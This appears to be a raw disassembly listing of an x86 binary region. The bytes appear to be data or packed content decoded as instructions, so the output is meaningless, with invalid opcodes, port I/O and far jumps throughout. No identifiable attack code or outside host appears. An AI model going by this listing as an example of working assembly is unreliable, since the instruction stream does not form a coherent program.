  4241c1:	fs stos BYTE PTR es:[edi],al
  4241c3:	push   ss
  4241c4:	imul   edi,DWORD PTR [esi+0x3a486667],0x98dd585
  4241ce:	test   BYTE PTR [esi-0x1f],al
  4241d1:	mov    WORD PTR [esi],es
  4241d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241d4:	test   BYTE PTR [edi],0xf5
  4241d7:	sub    BYTE PTR [edi],0x7
  4241da:	arpl   WORD PTR [esi+0x28603dcd],cx
  4241e0:	inc    esp
  4241e1:	inc    ebp
  4241e2:	push   0xe
  4241e4:	mov    edi,0xc13faf47
  4241e9:	xchg   BYTE PTR [ebx],ch
  4241eb:	push   edx
  4241ec:	xchg   esp,edi
  4241ee:	mov    ecx,0x23ea1924
  4241f3:	jecxz  0x424261
  4241f5:	je     0x424257
  4241f7:	mov    ebx,0x2910b160
  4241fc:	test   eax,0xac46d5db
  424201:	nop
  424202:	stc    
  424203:	dec    edx
  424204:	push   ss
  424205:	adc    DWORD PTR [edx],ebx
  424207:	outs   dx,DWORD PTR ds:[esi]
  424208:	stc    
  424209:	add    ah,ch
  42420b:	push   0x30
  42420d:	or     al,0x49
  42420f:	mov    edx,0x1bd32461
  424214:	fdivr  DWORD PTR [ecx+0x191899b8]
  42421a:	xlat   BYTE PTR ds:[ebx]
  42421b:	or     bh,BYTE PTR [ebx]
  42421d:	push   edx
  42421e:	enter  0x102b,0x51
  424222:	in     al,0x33
  424224:	icebp  
  424225:	out    0xe4,eax
  424227:	or     al,0xc1
  424229:	seta   BYTE PTR [esi-0x5c]
  42422d:	leave  
  42422e:	push   edx
  42422f:	pop    edx
  424230:	xlat   BYTE PTR ds:[ebx]
  424231:	xchg   ebp,eax
  424232:	stos   DWORD PTR es:[edi],eax
  424233:	cmp    cl,dh
  424235:	push   ecx
  424236:	sahf   
  424237:	adc    cl,BYTE PTR [edi+0x32]
  42423a:	fild   QWORD PTR [ebx-0x6a2c1b45]
  424240:	out    dx,al
	...
  4242b1:	add    BYTE PTR [eax],al
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0xb9bba4bf,eax
  4242c2:	outs   dx,DWORD PTR ds:[esi]
  4242c3:	cdq    
  4242c4:	mov    eax,DWORD PTR [ecx+0xf50001]
  4242ca:	add    BYTE PTR [eax],al
  4242cc:	daa    
  4242cd:	adc    bh,BYTE PTR [edi+0x1b]
  4242d0:	push   eax
  4242d1:	add    DWORD PTR [edi+0x3eb99cec],eax
  4242d7:	cwde   
  4242d8:	ds inc edx
  4242da:	adc    al,0x1a
  4242dc:	jp     0x424302
  4242de:	xchg   ecx,eax
  4242df:	pop    edi
  4242e0:	inc    eax
  4242e1:	fsubr  QWORD PTR [esp+ebx*8-0x51bf4bb4]
  4242e8:	(bad)  
  4242e9:	jbe    0x42436a
  4242eb:	shr    bh,0x7d
  4242ee:	inc    edx
  4242ef:	(bad)  
  4242f0:	fnstcw WORD PTR [edi+esi*1]
  4242f3:	pop    ebp
  4242f4:	fld    st(3)
  4242f6:	mov    DWORD PTR [edx],eax
  4242f8:	push   eax
  4242f9:	pop    es
  4242fa:	or     DWORD PTR [edi+edx*4+0x33f8d252],eax
  424301:	loopne 0x4242c2
  424303:	lea    ebp,[esi]
  424305:	int    0x5f
  424307:	dec    esi
  424308:	add    edi,DWORD PTR [eax-0x41]
  42430b:	or     BYTE PTR [edx],dh
  42430d:	dec    esp
  42430e:	cmp    bl,BYTE PTR [edx]
  424310:	jmp    0xe43b:0xa1b134c6
  424317:	add    BYTE PTR [eax],dh
  424319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42431a:	lock dec eax
  42431c:	test   bh,ch
  42431e:	test   BYTE PTR [ecx],dl
  424320:	int3   
  424321:	arpl   WORD PTR [ecx],bp
  424323:	or     DWORD PTR [ebp-0x53],esp
  424326:	inc    esp
  424327:	std    
  424328:	idiv   BYTE PTR ds:0x5a5faaf6
  42432e:	js     0x4242d3
  424330:	inc    ebp
  424331:	add    esp,DWORD PTR es:[ebx+ecx*1-0x4b]
  424336:	icebp  
  424337:	popf   
  424338:	in     al,dx
  424339:	ss jne 0x42439f
  42433c:	inc    eax
  42433d:	push   0xa0dcdda9
  424342:	test   al,0x58
  424344:	ret    
  424345:	mul    BYTE PTR [ebx+0x3]
  424348:	xchg   ebx,eax
  424349:	retf   
  42434a:	mov    bh,0x7b
  42434c:	push   esp
  42434d:	sbb    cl,BYTE PTR [ebp+0x412273b5]
  424353:	xchg   cl,cl
  424355:	jbe    0x424397
  424357:	push   0x384c1521
  42435c:	out    0xc2,eax
  42435e:	out    0xb6,eax
  424360:	adc    DWORD PTR [ebp-0x7cc41d8e],0xffffffd5
  424367:	pop    ebx
  424368:	out    0x12,al
  42436a:	push   es
  42436b:	ror    BYTE PTR [eax-0x71],0x5f
  42436f:	imul   ebp,DWORD PTR [ebx+edi*8],0x2577ef24
  424376:	shl    BYTE PTR [ecx+0x7e2706d4],1
  42437c:	imul   edx,DWORD PTR [esi],0x9c5e884f
  424382:	pop    eax
  424383:	pop    esp
  424384:	mov    esi,0xecf0d388
  424389:	pop    ds
  42438a:	ficomp WORD PTR [esi+ebp*8]
  42438d:	mov    DWORD PTR [edi],esi
  42438f:	inc    ecx
  424390:	cmp    eax,0x9e4622e1
  424395:	addr16 add ah,dl
  424398:	sub    BYTE PTR [edi+0x69],bl
  42439b:	jbe    0x42434e
  42439d:	push   edx
  42439e:	add    bh,BYTE PTR [ebx+0x18a20d85]
  4243a4:	fistp  QWORD PTR [ecx]
  4243a6:	retf   
  4243a7:	retf   
  4243a8:	int3   
  4243a9:	out    0x86,al
  4243ab:	push   esi
  4243ac:	and    BYTE PTR [edi],bh
  4243ae:	and    BYTE PTR [edx+0x1ebc20e1],dh
  4243b4:	cmp    DWORD PTR [ebx],edi
  4243b6:	outs   dx,DWORD PTR ds:[esi]
  4243b7:	mov    es,WORD PTR [ebp+0xc]
  4243ba:	jae    0x42435e
  4243bc:	inc    edx
  4243bd:	jb     0x424342
  4243bf:	xchg   ebx,eax
	...
  424434:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42443b:	mov    edi,0xd28abb70
  424440:	repz in eax,dx
  424442:	push   ebp
  424443:	fild   WORD PTR [eax-0xafffe7e]
  424449:	add    BYTE PTR [eax],al
  42444b:	add    BYTE PTR [edx],ah
  42444d:	jae    0x424450
  42444f:	xchg   dh,bh
  424451:	scas   al,BYTE PTR es:[edi]
  424452:	clc    
  424453:	icebp  
  424454:	gs pop edi
  424456:	push   0xfe4392bf
  42445b:	inc    edx
  42445c:	test   DWORD PTR [ebx],esi
  42445e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42445f:	jno    0x424430
  424461:	jae    0x424447
  424463:	outs   dx,BYTE PTR ds:[esi]
  424464:	push   es
  424465:	out    dx,al
  424466:	xchg   DWORD PTR [eax-0x3e],ebp
  424469:	lahf   
  42446a:	adc    eax,0x8174db82
  42446f:	jno    0x424433
  424471:	xchg   BYTE PTR [ebx-0x75],al
  424474:	out    dx,eax
  424475:	adc    DWORD PTR [eax+0x76ee7fe],eax
  42447b:	int3   
  42447c:	pop    ds
  42447d:	leave  
  42447e:	jbe    0x4244ef
  424480:	out    dx,al
  424481:	mov    ds:0xd29453d3,al
  424486:	adc    al,0x58
  424488:	cs cli 
  42448a:	mul    DWORD PTR [ebx+0x5c]
  42448d:	dec    edx
  42448e:	push   ebp
  42448f:	inc    esi
  424490:	add    eax,0x2f78c132
  424495:	ror    DWORD PTR [edx+0x10190b0a],0x56
  42449c:	adc    DWORD PTR [esi-0x2899e6af],esi
  4244a2:	fs gs (bad) 
  4244a5:	fwait
  4244a6:	mov    BYTE PTR [esi],al
  4244a8:	push   ss
  4244a9:	inc    edx
  4244aa:	ins    DWORD PTR es:[edi],dx
  4244ab:	adc    ch,BYTE PTR [esi-0x44e1697e]
  4244b1:	fdivr  DWORD PTR [ecx+0x40c67184]
  4244b7:	pop    ss
  4244b8:	or     cl,BYTE PTR [edx+0x1df8a4ad]
  4244be:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4244c0:	in     al,0xf2
  4244c2:	mov    edi,DWORD PTR [edx-0x19ff80ab]
  4244c8:	and    bl,BYTE PTR [ebx-0x21774942]
  4244ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244cf:	sub    ebx,DWORD PTR [eax+0x5dbd17b4]
  4244d5:	jl     0x42448f
  4244d7:	dec    ecx
  4244d8:	mov    ds:0x85eec16b,eax
  4244dd:	cli    
  4244de:	adc    BYTE PTR [ecx+0x44],cl
  4244e1:	sub    al,0x5e
  4244e3:	(bad)  
  4244e4:	fisttp WORD PTR [ebx+eax*1-0x3b3a04b6]
  4244eb:	mov    bl,0x17
  4244ed:	inc    esp
  4244ee:	div    BYTE PTR [esi]
  4244f0:	ret    
  4244f1:	outs   dx,BYTE PTR ds:[esi]
  4244f2:	fcmovne st,st(2)
  4244f4:	xor    edi,DWORD PTR [eax+edx*8-0x2b298c73]
  4244fb:	or     DWORD PTR [edi-0x31af2632],esi
  424501:	les    edi,FWORD PTR [eax-0x1c]
  424504:	mov    dl,0xb7
  424506:	mov    cl,0x49
  424508:	shl    ecx,1
  42450a:	aam    0xac
  42450c:	outs   dx,DWORD PTR ds:[esi]
  42450d:	mov    dl,BYTE PTR [esi+0x750f740d]
  424513:	mov    ds:0xac28489,al
  424518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424519:	ins    DWORD PTR es:[edi],dx
  42451a:	arpl   WORD PTR [esi+esi*4],di
  42451d:	xchg   edi,eax
  42451e:	aaa    
  42451f:	aas    
  424520:	adc    ebp,DWORD PTR [edx+0x6d]
  424523:	retf   
  424524:	aad    0x40
  424526:	sub    bh,BYTE PTR [eax+0x6a]
  424529:	xor    eax,0x94b29562
  42452e:	retf   0x86fb
  424531:	fwait
  424532:	mov    ds:0x8855ce1e,al
  424537:	push   edx
  424538:	xchg   esi,eax
  424539:	xor    BYTE PTR [edx+0x3c],cl
  42453c:	fiadd  DWORD PTR [esi+0xf5b3ff]
	...
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    ebp,ebx
  4245c1:	popa   
  4245c2:	xchg   BYTE PTR [ecx+0x18375],cl
  4245c8:	cmc    
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [ecx],bl
  4245cd:	cmp    BYTE PTR [edx+ecx*2],dh
  4245d0:	(bad)  
  4245d2:	js     0x424623
  4245d4:	pusha  
  4245d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245d6:	fnstcw WORD PTR [edx-0x6a]
  4245d9:	jo     0x4245fc
  4245db:	cli    
  4245dc:	ret    
  4245dd:	jl     0x424595
  4245df:	adc    ecx,DWORD PTR [ebx-0x8]
  4245e2:	test   BYTE PTR [ebp+0x5c],cl
  4245e5:	mov    ds:0xb9e9f724,eax
  4245ea:	addr16 loop 0x4245c9
  4245ed:	xchg   ecx,eax
  4245ee:	rcr    BYTE PTR [edi+0x1d169916],cl
  4245f4:	sbb    BYTE PTR [edi+0x33b7bea],cl
  4245fa:	fcmovb st,st(4)
  4245fc:	pop    esp
  4245fd:	add    DWORD PTR ds:0x6c488af,eax
  424603:	in     al,0x9f
  424605:	adc    al,0x75
  424607:	cmc    
  424608:	(bad)  
  424609:	shr    ecx,cl
  42460b:	pop    ds
  42460c:	lods   al,BYTE PTR ds:[esi]
  42460d:	fdiv   st(2),st
  42460f:	in     eax,dx
  424610:	test   DWORD PTR [ebx+eax*2],eax
  424613:	dec    eax
  424615:	pop    edx
  424616:	mov    ebp,0x13cda9a7
  42461b:	int    0xab
  42461d:	test   DWORD PTR [ebx],ebp
  42461f:	mov    edx,0x5a542761
  424624:	hlt    
  424625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424626:	popf   
  424627:	fnsave [edi-0x5f]
  42462a:	jbe    0x4246a1
  42462c:	add    al,0xad
  42462e:	loop   0x424635
  424630:	ds push ds
  424632:	(bad)  
  424633:	jl     0x4245fd
  424635:	and    DWORD PTR [ecx-0x31],0x3685779d
  42463c:	inc    esi
  42463d:	out    0x4a,al
  42463f:	push   0xffffff86
  424641:	scas   eax,DWORD PTR es:[edi]
  424642:	inc    edi
  424643:	xor    BYTE PTR [eax],0x54
  424646:	rcr    BYTE PTR [ebx*2-0x60bb43ec],0x80
  42464e:	jp     0x424688
  424650:	mov    edx,0xcb7e0dfc
  424655:	adc    ch,al
  424657:	push   0xffffff9e
  424659:	(bad)  
  42465b:	mov    ebp,0xd1ee8987
  424660:	mov    ds:0x27a0896c,eax
  424665:	cld    
  424666:	xchg   ebp,eax
  424667:	mov    edx,0x11def32
  42466c:	lea    esi,[ebp+0x7571455c]
  424672:	gs push eax
  424674:	push   ebp
  424675:	dec    edi
  424676:	scas   al,BYTE PTR es:[edi]
  424677:	adc    BYTE PTR [ecx+0x672cf74c],ah
  42467d:	shl    DWORD PTR [ebp-0x47],1
  424680:	imul   ebp,DWORD PTR [ebx+ebx*4+0x33],0xbb2f73ff
  424688:	jne    0x424651
  42468a:	xchg   ecx,eax
  42468b:	mov    BYTE PTR [ebx-0x53553371],ch
  424691:	mov    eax,ds:0x5d6a44bb
  424696:	repz add DWORD PTR [edx-0x54df5cfb],ecx
  42469d:	mov    ebp,0xdccf47aa
  4246a2:	xor    BYTE PTR [edi],al
  4246a4:	sub    edi,DWORD PTR [edi+0x6b]
  4246a7:	adc    ebp,DWORD PTR [edi-0x14]
  4246aa:	js     0x4246d4
  4246ac:	or     ah,al
  4246ae:	out    0xe1,eax
  4246b0:	inc    esi
  4246b1:	push   ecx
  4246b2:	(bad)  
  4246b4:	test   al,0x5e
  4246b6:	jno    0x424694
  4246b8:	pop    edx
  4246b9:	or     dl,bl
  4246bb:	or     BYTE PTR [edx-0x46],bh
  4246be:	adc    eax,0x8c3f
	...
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fld    QWORD PTR [esi-0x5]
  424742:	sbb    DWORD PTR [ebx],0x6a
  424745:	test   BYTE PTR [ecx],al
  424747:	add    ch,dh
  424749:	add    BYTE PTR [eax],al
  42474b:	add    BYTE PTR [ebp+0x49],bh
  42474e:	xlat   BYTE PTR ds:[ebx]
  42474f:	cmp    BYTE PTR [ebp+0x147fc273],dh
  424755:	push   ds
  424756:	sbb    DWORD PTR [ebp+ebp*2-0x5a28edc6],ecx
  42475d:	xor    DWORD PTR [esi+eax*2+0x61],edx
  424761:	dec    edx
  424762:	scas   eax,DWORD PTR es:[edi]
  424763:	gs (bad) 
  424766:	mov    esp,0x564912f3
  42476b:	sbb    BYTE PTR [ebx],dh
  42476d:	dec    edx
  42476e:	mov    ds:0x6cc1b56,al
  424773:	adc    BYTE PTR [edi-0x4d2952d2],ah
  424779:	mov    ah,0x46
  42477b:	fidiv  WORD PTR ds:0x81d62c36
  424781:	push   eax
  424782:	stc    
  424783:	or     bl,BYTE PTR ss:[eax-0x27]
  424787:	inc    al
  424789:	dec    ebp
  42478a:	(bad)  
  42478b:	aam    0xff
  42478d:	push   ecx
  42478e:	sub    al,0xc3
  424790:	(bad)  
  424791:	adc    cl,BYTE PTR [ebp+0x3d]
  424794:	adc    BYTE PTR [edx+0x148ea187],bl
  42479a:	and    eax,0x23faddd3
  42479f:	jmp    0x424815
  4247a1:	daa    
  4247a2:	and    edx,eax
  4247a4:	cld    
  4247a5:	xor    DWORD PTR [esi+eiz*2],0xffffffbb
  4247a9:	ins    DWORD PTR es:[edi],dx
  4247aa:	outs   dx,DWORD PTR ds:[esi]
  4247ab:	(bad)  
  4247ac:	jp     0x4247f2
  4247ae:	xchg   edi,eax
  4247af:	pop    DWORD PTR [esi+0x5a]
  4247b2:	out    dx,eax
  4247b3:	push   edx
  4247b4:	push   esi
  4247b5:	jle    0x42473e
  4247b7:	cmp    DWORD PTR [ebx-0x53],esi
  4247ba:	xor    DWORD PTR [ebp+0x58f305be],edx
  4247c0:	sahf   
  4247c1:	mov    al,0x25
  4247c3:	mov    ah,0xe0
  4247c5:	mov    esp,0x2a992d30
  4247ca:	shl    DWORD PTR [eax+0x93758f0],cl
  4247d0:	adc    BYTE PTR [edi-0x3298c2e5],ah
  4247d6:	into   
  4247d7:	ret    0xa89f
  4247da:	ja     0x424821
  4247dc:	jmp    0x4247ec
  4247de:	jg     0x4247b6
  4247e0:	lods   eax,DWORD PTR ds:[esi]
  4247e1:	mov    ch,0xcb
  4247e3:	mov    edi,0x71e29b55
  4247e8:	jbe    0x4247b3
  4247ea:	jmp    0x424838
  4247ec:	or     al,0xa8
  4247ee:	frstor [ebx]
  4247f0:	xchg   DWORD PTR [ecx-0x64a00a66],ebx
  4247f6:	jp     0x42486a
  4247f8:	sar    BYTE PTR [esi],0xa4
  4247fb:	popf   
  4247fc:	shl    DWORD PTR [edx-0xe420c4a],0x42
  424803:	cdq    
  424804:	hlt    
  424805:	(bad)  
  424806:	imul   ebp,DWORD PTR [eax],0x98f7d44f
  42480c:	jmp    0x999:0xeb165d3
  424813:	jns    0x424814
  424815:	mov    BYTE PTR [ebx],bl
  424817:	and    al,dh
  424819:	stos   DWORD PTR es:[edi],eax
  42481a:	add    DWORD PTR [eax-0x36],esi
  42481d:	aam    0xeb
  42481f:	fwait
  424820:	jmp    0x166c:0xa13ca712
  424827:	dec    ecx
  424828:	fsub   DWORD PTR [edi]
  42482a:	aad    0xe2
  42482c:	aam    0x3b
  42482e:	cmp    DWORD PTR [edx-0x7d],esp
  424831:	pop    ss
  424832:	fwait
  424833:	(bad)  
  424834:	lds    ebp,FWORD PTR [edi]
  424836:	mov    bh,0x69
  424838:	iret   
  424839:	(bad)  
  42483a:	fidiv  DWORD PTR [esi+0x4457afcd]
  424840:	jo     0x424842
	...
  4248b2:	add    BYTE PTR [eax],al
  4248b4:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424937
  4248c1:	mov    edx,ebx
  4248c3:	mov    ds:0x1855f,eax
  4248c8:	cmc    
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    dl,ch
  4248cd:	out    0x40,eax
  4248cf:	mov    dl,0xfc
  4248d1:	push   esi
  4248d2:	xchg   edi,eax
  4248d3:	shl    DWORD PTR [edi-0x4e],0xd3
  4248d7:	inc    eax
  4248d8:	jns    0x42489b
  4248da:	dec    edi
  4248db:	int3   
  4248dc:	addr16 jge 0x42493d
  4248df:	bnd jmp 0x424901
  4248e2:	xchg   BYTE PTR [edi],bl
  4248e4:	or     bh,al
  4248e6:	mov    ebp,DWORD PTR [edi+0x3a]
  4248e9:	adc    al,0x67
  4248eb:	xor    al,0x79
  4248ed:	sti    
  4248ee:	dec    ebx
  4248ef:	mov    dl,0xa1
  4248f1:	dec    esi
  4248f2:	jle    0x4248e5
  4248f4:	int3   
  4248f5:	inc    esp
  4248f6:	pop    edi
  4248f7:	jo     0x4248c3
  4248f9:	adc    esi,DWORD PTR [ecx-0x8cad3d3]
  4248ff:	psrlw  mm0,QWORD PTR [esp+ebp*1-0x14]
  424904:	push   ebp
  424905:	xchg   esi,eax
  424906:	das    
  424907:	call   0x46af:0xdbac0ada
  42490e:	mov    eax,ds:0x5bf08ef5
  424913:	(bad)  
  424914:	cmp    al,0x9b
  424916:	cmp    cl,BYTE PTR [esp+edx*4+0x708b3b6f]
  42491d:	pop    eax
  42491e:	aam    0x4c
  424920:	jmp    0xe93e:0x72d95edb
  424927:	adc    ah,BYTE PTR [edi+0x3c94b803]
  42492d:	mov    esi,edx
  42492f:	ror    BYTE PTR [ebp-0x5b811ebe],0xcf
  424936:	js     0x424929
  424938:	les    bx,DWORD PTR [edi-0x45]
  42493c:	out    0xbf,al
  42493e:	sbb    al,0x3
  424940:	pop    ebp
  424941:	xor    dh,bh
  424943:	mov    eax,0xe2747b57
  424948:	push   cs
  424949:	call   0xcb9ad461
  42494e:	lods   al,BYTE PTR ds:[esi]
  42494f:	add    DWORD PTR [edx+eax*2-0x45],ebx
  424953:	ins    DWORD PTR es:[edi],dx
  424954:	xchg   ebx,eax
  424955:	lods   al,BYTE PTR ds:[esi]
  424956:	test   al,0xa5
  424958:	aam    0xf8
  42495a:	and    ebx,DWORD PTR [edi-0x5040fdfa]
  424960:	jae    0x42490e
  424962:	add    bl,BYTE PTR [esi]
  424964:	mov    dl,0x5d
  424966:	call   0x4a413918
  42496b:	sbb    al,0x64
  42496d:	mov    ch,0x61
  42496f:	jo     0x424993
  424971:	or     eax,0x804c8f8b
  424976:	xor    BYTE PTR [ebp+esi*4-0x6a12f6c0],dh
  42497d:	cmp    DWORD PTR [esi-0x19b28db5],0xfe0823aa
  424987:	rol    BYTE PTR [eax+0x3973f1d7],1
  42498d:	ror    DWORD PTR [eax+0x6cefddf6],0x5f
  424994:	adc    DWORD PTR [eax+0x2a04e3a7],esp
  42499a:	out    0xa8,eax
  42499c:	add    eax,ecx
  42499e:	fist   DWORD PTR [ebx]
  4249a0:	repnz into 
  4249a2:	mov    BYTE PTR [eax],bl
  4249a4:	fsub   DWORD PTR [edx+eiz*2+0x589545da]
  4249ab:	xchg   DWORD PTR [edi+eiz*2],esp
  4249ae:	(bad)  
  4249af:	inc    edx
  4249b0:	fsubr  DWORD PTR [esi-0x219765f6]
  4249b6:	jmp    0x4249de
  4249b8:	sbb    BYTE PTR [ebx+0x78],ch
  4249bb:	daa    
  4249bc:	add    BYTE PTR [ebx+0x71],0x66
  4249c0:	xor    al,0x0
	...
  424a32:	add    BYTE PTR [eax],al
  424a34:	xor    BYTE PTR ds:0xdf7d9f75,bh
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	arpl   WORD PTR [esi+edx*2],ax
  424a43:	mov    bh,0x54
  424a45:	xchg   BYTE PTR [ecx],al
  424a47:	add    ch,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    al,bh
  424a4d:	sub    al,0x3c
  424a4f:	test   eax,0x5cf39208
  424a54:	fsub   QWORD PTR [ecx-0x1e098244]
  424a5a:	sbb    ebx,DWORD PTR [ebp+edx*2+0x6b2f0b02]
  424a61:	mov    ds:0xebd76d68,al
  424a66:	stc    
  424a67:	dec    eax
  424a68:	(bad)  
  424a69:	adc    eax,0xc2f2fdff
  424a6e:	pop    ds
  424a6f:	adc    bl,BYTE PTR [ebp+0xf9e0774]
  424a75:	jge    0x424a5f
  424a77:	loope  0x424a47
  424a79:	mov    bh,0xf3
  424a7b:	cwde   
  424a7c:	xchg   esp,eax
  424a7d:	add    DWORD PTR [edx],edi
  424a7f:	shr    BYTE PTR [ebp-0x62],cl
  424a82:	test   DWORD PTR [edx+0xf7876ba],ebp
  424a88:	pop    esp
  424a89:	push   es
  424a8a:	push   ebx
  424a8b:	mov    bl,0x8e
  424a8d:	and    al,BYTE PTR [ebx+0x7b]
  424a90:	xchg   edx,eax
  424a91:	inc    ecx
  424a92:	mov    edi,0x938421ec
  424a97:	push   eax
  424a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a99:	or     eax,0xac92341a
  424a9e:	int3   
  424a9f:	pop    edi
  424aa0:	pop    eax
  424aa1:	out    dx,eax
  424aa2:	or     al,0x74
  424aa4:	mov    ebp,esi
  424aa6:	sbb    DWORD PTR [edx],esi
  424aa8:	push   esi
  424aa9:	inc    ecx
  424aaa:	js     0x424af1
  424aac:	inc    ecx
  424aad:	call   DWORD PTR [ecx]
  424aaf:	ins    BYTE PTR es:[edi],dx
  424ab0:	rcr    BYTE PTR [esi],1
  424ab2:	inc    ecx
  424ab3:	mov    ebp,0x5e55441c
  424ab8:	or     eax,0x12df81c8
  424abd:	std    
  424abe:	jne    0x424af8
  424ac0:	jae    0x424abe
  424ac2:	push   edx
  424ac3:	jbe    0x424abd
  424ac5:	push   es
  424ac6:	inc    ebx
  424ac7:	inc    ebp
  424ac8:	shl    BYTE PTR [edi],1
  424aca:	in     al,dx
  424acb:	cld    
  424acc:	popf   
  424acd:	fmulp  st(0),st
  424acf:	add    ecx,DWORD PTR [esp+ebp*4-0x23166fd2]
  424ad6:	ja     0x424b55
  424ad8:	into   
  424ad9:	cdq    
  424ada:	cmp    al,0x3c
  424adc:	mov    ch,0x1c
  424ade:	jl     0x424ab0
  424ae0:	mov    ebp,DWORD PTR [ebx*1-0x138af6]
  424ae7:	xchg   esi,eax
  424ae8:	xchg   BYTE PTR [eax],al
  424aea:	mov    edi,0xc8d19ac5
  424aef:	pop    edx
  424af0:	pop    ebp
  424af1:	ud1    ecx,DWORD PTR [ecx-0x20da792f]
  424af8:	sub    eax,0x384fe891
  424afd:	mov    BYTE PTR [edx-0x2f89c6d6],bl
  424b03:	pop    esp
  424b04:	ja     0x424b64
  424b06:	mov    esp,0x897a6146
  424b0b:	cmp    bh,BYTE PTR [eax+0x48]
  424b0e:	fist   DWORD PTR [esi]
  424b10:	and    BYTE PTR [ebx-0x69],dh
  424b13:	rcl    BYTE PTR cs:[edi+0x27f027fa],1
  424b1a:	inc    eax
  424b1b:	nop
  424b1c:	and    bh,BYTE PTR [ebx]
  424b1e:	inc    edi
  424b1f:	inc    ecx
  424b20:	scas   al,BYTE PTR es:[edi]
  424b21:	call   0x7304:0xd7bd471e
  424b28:	mov    edi,0x8e06c1f7
  424b2d:	push   edx
  424b2e:	gs dec edi
  424b30:	stos   DWORD PTR es:[edi],eax
  424b31:	scas   eax,DWORD PTR es:[edi]
  424b32:	add    esp,0xfffffffc
  424b35:	jg     0x424b32
  424b37:	cwde   
  424b38:	fadd   QWORD PTR [edi-0x3f]
  424b3b:	iret   
  424b3c:	inc    edx
  424b3d:	mov    bl,0xf3
  424b3f:	lock xor al,0x0
	...
  424bb2:	add    BYTE PTR [eax],al
  424bb4:	std    
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x1bb9f881]
  424bc1:	std    
  424bc2:	fldenv [ecx+ecx*2-0xafffe79]
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [edi-0x31],cl
  424bce:	(bad)  
  424bd0:	in     eax,0x1c
  424bd2:	lahf   
  424bd3:	mov    ah,0x4a
  424bd5:	dec    esp
  424bd6:	fnsave [eax+ebx*2+0x6e594428]
  424bdd:	mov    dl,0xe5
  424bdf:	and    eax,0x69f42c17
  424be4:	and    eax,0x6b2f487a
  424be9:	add    BYTE PTR [edi-0x5e7f6dbe],0x4f
  424bf0:	sub    al,ah
  424bf2:	cmc    
  424bf3:	ret    0x2a22
  424bf6:	push   esp
  424bf7:	jge    0x424c5f
  424bf9:	(bad)  
  424bfa:	inc    edi
  424bfb:	mov    WORD PTR [edx-0x719dc9f4],?
  424c01:	mov    BYTE PTR [eax+0x68],0x35
  424c05:	retf   0x14b7
  424c08:	sahf   
  424c09:	je     0x424c3c
  424c0b:	mov    bl,0xe4
  424c0d:	push   esp
  424c0e:	add    edx,DWORD PTR [edi]
  424c10:	pop    es
  424c11:	push   ebp
  424c12:	out    0x43,eax
  424c14:	fst    DWORD PTR [ecx+esi*1-0x222348db]
  424c1b:	push   eax
  424c1c:	scas   eax,DWORD PTR es:[edi]
  424c1d:	or     BYTE PTR [edi],bh
  424c1f:	fwait
  424c20:	lea    ebx,[ebp-0x37fcf679]
  424c26:	lods   eax,DWORD PTR ds:[esi]
  424c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c28:	lods   eax,DWORD PTR ds:[esi]
  424c29:	clc    
  424c2a:	loope  0x424c9e
  424c2c:	xor    ah,dh
  424c2e:	imul   edx,DWORD PTR [ebx],0xffffffce
  424c31:	in     eax,dx
  424c32:	ja     0x424c44
  424c34:	mov    ebx,0xca3dc421
  424c39:	stos   BYTE PTR es:[edi],al
  424c3a:	adc    eax,0xe65bca3f
  424c3f:	sbb    BYTE PTR [ebp+0x55],cl
  424c42:	cmc    
  424c43:	mov    cl,0x7d
  424c45:	lahf   
  424c46:	xchg   esp,eax
  424c47:	xchg   DWORD PTR [ebx+0x13],ecx
  424c4a:	push   ds
  424c4b:	mov    edx,0x64e809e9
  424c50:	inc    ecx
  424c51:	sar    DWORD PTR [esi],1
  424c53:	jb     0x424ca0
  424c55:	in     eax,0x7d
  424c57:	test   DWORD PTR [ebx+0x696b375a],0xdb56123e
  424c61:	ins    BYTE PTR es:[edi],dx
  424c62:	or     DWORD PTR [esp+ebp*8],esp
  424c65:	push   es
  424c66:	int3   
  424c67:	loope  0x424c36
  424c69:	mov    dh,0xce
  424c6b:	aas    
  424c6c:	xor    dl,BYTE PTR [ebx+edx*1]
  424c6f:	sub    ebx,eax
  424c71:	sub    DWORD PTR [eax],esp
  424c73:	xchg   ebx,eax
  424c74:	mov    cl,0xe
  424c76:	rol    DWORD PTR [ebx+0x66f4f84c],1
  424c7c:	aas    
  424c7d:	xchg   esi,eax
  424c7e:	inc    edx
  424c7f:	push   edi
  424c80:	enter  0x6bcf,0x4e
  424c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c85:	mov    cl,0x7f
  424c87:	and    eax,edx
  424c89:	fcom   QWORD PTR [esi+0x16]
